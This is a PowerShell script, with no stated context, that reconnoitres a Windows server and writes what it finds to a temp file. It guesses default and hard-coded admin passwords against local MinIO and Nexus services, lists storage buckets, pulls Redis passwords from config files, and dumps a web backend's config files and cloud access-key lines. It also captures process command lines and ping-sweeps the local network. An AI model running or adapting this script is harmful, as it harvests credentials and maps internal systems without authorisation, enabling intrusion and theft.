
$T="C:\Windows\TEMP"; $R="$T\h4deep2.txt"
del $R 2>$null
function W($s){ Add-Content -Path $R -Value $s }
W ("TIME " + (Get-Date -Format "yyyy-MM-dd HH:mm:ss"))
W "=== MINIO_CHECK ==="
try { $r = Invoke-WebRequest "http://127.0.0.1:9005/minio/health/live" -UseBasicParsing -TimeoutSec 5; W ("MINIO_LIVE: " + $r.StatusCode) } catch { W ("MINIO_LIVE_ERR: " + $_.Exception.Message) }
try { $cred = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("admin:Admin@123456")); $h = @{ "Authorization" = "Basic " + $cred }; $r = Invoke-WebRequest "http://127.0.0.1:9005/" -UseBasicParsing -TimeoutSec 8 -Headers $h; W ("MINIO_ROOT: " + $r.StatusCode + " " + $r.Content.Substring(0, [Math]::Min(300, $r.Content.Length))) } catch { W ("MINIO_ROOT_ERR: " + $_.Exception.Message) }
try { $cred = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("admin:Admin@123456")); $h = @{ "Authorization" = "Basic " + $cred }; $r = Invoke-WebRequest "http://127.0.0.1:9005/buckets?prefix=" -UseBasicParsing -TimeoutSec 8 -Headers $h; W ("MINIO_BUCKETS: " + $r.Content.Substring(0, [Math]::Min(500, $r.Content.Length))) } catch { W ("MINIO_BUCKETS_ERR: " + $_.Exception.Message) }
W "=== NEXUS_CRED ==="
foreach ($u in @("admin:admin123","admin:admin","admin:sonatype")) {
  try { $cred = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes($u)); $h = @{ "Authorization" = "Basic " + $cred }; $r = Invoke-WebRequest "http://127.0.0.1:8181/service/rest/v1/status/check?full=true" -UseBasicParsing -TimeoutSec 8 -Headers $h; W ("NEXUS_$u: " + $r.StatusCode + " " + $r.Content.Substring(0, [Math]::Min(300, $r.Content.Length))) } catch { W ("NEXUS_$u ERR: " + $_.Exception.Message) }
}
W "=== OLLAMA_PROCS ==="
Get-CimInstance Win32_Process | Where-Object { $_.ProcessId -in 11700,12152,12952 } | ForEach-Object { W ("PID " + $_.ProcessId + " NAME " + $_.Name + " CMD " + $_.CommandLine) }
W "=== REDIS_CONF ==="
Get-ChildItem "D:\" -Recurse -Depth 3 -Filter "redis*.conf" -EA SilentlyContinue | Select-Object -First 5 | ForEach-Object { W ("  FILE: " + $_.FullName); Get-Content $_.FullName -EA SilentlyContinue | Where-Object { $_ -match "requirepass|bind|port|protected" } | Select-Object -First 8 | ForEach-Object { W ("    " + $_) } }
$rc = Get-ChildItem "C:\" -Recurse -Depth 4 -Filter "redis*.conf" -EA SilentlyContinue | Select-Object -First 3
$rc | ForEach-Object { W ("  FILE: " + $_.FullName); Get-Content $_.FullName -EA SilentlyContinue | Where-Object { $_ -match "requirepass|bind|port|protected" } | Select-Object -First 8 | ForEach-Object { W ("    " + $_) } }
W "=== WANGZHAN_AK ==="
Get-ChildItem "D:\webapps\wangzhan\backend-python" -Recurse -Depth 2 -EA SilentlyContinue | Where-Object { $_.Name -match "\.(ini|cfg|json|env|yaml|yml)$" -and $_.Name -notmatch "requirements" } | ForEach-Object { W ("  FILE: " + $_.FullName); Get-Content $_.FullName -EA SilentlyContinue | ForEach-Object { W ("    " + $_) } }
$cfg = Get-Content "D:\webapps\wangzhan\backend-python\app.py" -EA SilentlyContinue
$cfg | Select-String "access_key_id|access_key_secret|sms_access" | Select-Object -First 10 | ForEach-Object { W ("  APP: " + $_.Line.Trim()) }
W "=== SHENTONG_HTTP6666 ==="
try { $r = Invoke-WebRequest "http://127.0.0.1:6666/" -UseBasicParsing -TimeoutSec 6; W ("6666: " + $r.StatusCode + " " + $r.Content.Substring(0, [Math]::Min(300, $r.Content.Length))) } catch { W ("6666_ERR: " + $_.Exception.Message) }
W "=== LAN_SCAN ==="
foreach ($h in @("192.168.0.1","192.168.0.2","192.168.0.100","192.168.0.200")) {
  $ok = Test-Connection $h -Count 1 -Quiet -EA SilentlyContinue
  W ("PING $h: " + $ok)
}
W "=== DONE ==="
exit 0
